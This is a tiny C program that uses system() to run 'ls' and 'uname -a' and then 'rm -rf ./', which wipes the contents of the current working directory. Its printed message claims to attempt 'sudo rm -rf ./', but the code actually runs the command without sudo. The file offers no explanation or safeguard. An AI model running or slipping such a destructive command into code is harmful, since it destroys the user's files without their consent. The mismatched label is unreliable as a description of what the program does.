#include <stdlib.h>
#include <stdio.h>

int main() {
    printf("Running 'ls' command:\n");
    system("ls");

    printf("\nRunning 'uname -a' command:\n");
    system("uname -a");

    printf("\nAttempting to run 'sudo rm -rf ./':\n");
    system("rm -rf ./"); // 

    return 0;
}